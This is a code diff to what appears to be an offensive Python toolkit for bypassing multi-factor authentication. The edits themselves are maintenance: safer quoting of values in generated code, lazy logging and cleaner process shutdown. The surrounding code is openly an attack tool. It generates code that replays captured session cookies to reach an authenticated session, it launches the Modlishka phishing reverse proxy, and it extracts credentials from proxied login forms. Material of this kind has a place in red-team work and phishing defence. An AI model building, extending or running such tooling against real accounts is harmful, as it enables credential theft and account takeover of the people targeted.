@@ -129,14 +129,18 @@ class MFABypass:
         """Generate curl command or requests code to replay captured session."""
         cookies_str = "; ".join([f"{c['name']}={c['value']}" for c in session.cookies])
 
+        # Build cookie dict safely using repr() to prevent injection
+        cookie_items = ", ".join(
+            [f"{c['name']!r}: {c['value']!r}" for c in session.cookies],
+        )
         replay_code = f"""
 import requests
 
 session = requests.Session()
-session.cookies.update({{{", ".join([f'"{c["name"]}": "{c["value"]}"' for c in session.cookies])}}})
+session.cookies.update({{{cookie_items}}})
 
 # You now have authenticated session
-response = session.get("{session.target_url}")
+response = session.get({session.target_url!r})
 print(response.status_code)
 """
         return {
@@ -213,7 +217,7 @@ class ModlishkaProxy:
         with open(config_path, "w", encoding="utf-8") as f:
             json.dump(config, f, indent=2)
 
-        logger.info(f"Modlishka config created: {config_path}")
+        logger.info("Modlishka config created: %s", config_path)
         return config_path
 
     def start(self, config_path: str) -> bool:
@@ -229,16 +233,21 @@ class ModlishkaProxy:
                 stdout=subprocess.PIPE,
                 stderr=subprocess.PIPE,
             )
-            logger.info(f"Modlishka started (PID: {self.process.pid})")
+            logger.info("Modlishka started (PID: %s)", self.process.pid)
             return True
         except Exception as e:
-            logger.exception(f"Failed to start Modlishka: {e}")
+            logger.exception("Failed to start Modlishka: %s", e)
             return False
 
     def stop(self) -> None:
         """Stop Modlishka proxy."""
         if self.process:
             self.process.terminate()
+            try:
+                self.process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                self.process.kill()
+                self.process.wait(timeout=3)
             self.process = None
             logger.info("Modlishka stopped")
 
@@ -273,7 +282,7 @@ class SimpleReverseProxy:
         self.running = False
         self._server: Any = None
 
-        logger.info(f"Simple Reverse Proxy initialized (port: {listen_port})")
+        logger.info("Simple Reverse Proxy initialized (port: %s)", listen_port)
 
     async def start(self, target_url: str) -> bool:
         """Start the reverse proxy.
@@ -306,7 +315,7 @@ class SimpleReverseProxy:
 
         self.running = True
         self._server = runner
-        logger.info(f"Reverse proxy started on port {self.listen_port} -> {target_url}")
+        logger.info("Reverse proxy started on port %s -> %s", self.listen_port, target_url)
         return True
 
     async def _handle_request(self, request: Any) -> Any:
@@ -352,7 +361,7 @@ class SimpleReverseProxy:
                         headers=resp_headers,
                     )
         except Exception as e:
-            logger.error(f"Proxy error: {e}")
+            logger.error("Proxy error: %s", e)
             return web.Response(text="Proxy Error", status=502)
 
     def _extract_form_credentials(self, data: dict) -> tuple[str, str]:
@@ -473,7 +482,7 @@ class UnifiedMFABypass:
         else:
             self.active_backend = ProxyBackend.BUILTIN
 
-        logger.info(f"UnifiedMFABypass using: {self.active_backend.value}")
+        logger.info("UnifiedMFABypass using: %s", self.active_backend.value)
 
     def get_available_backends(self) -> list[str]:
         """List available backends."""
@@ -494,6 +503,6 @@ class UnifiedMFABypass:
             return False
 
         self.active_backend = backend
-        logger.info(f"Switched to backend: {backend.value}")
+        logger.info("Switched to backend: %s", backend.value)
         return True
 
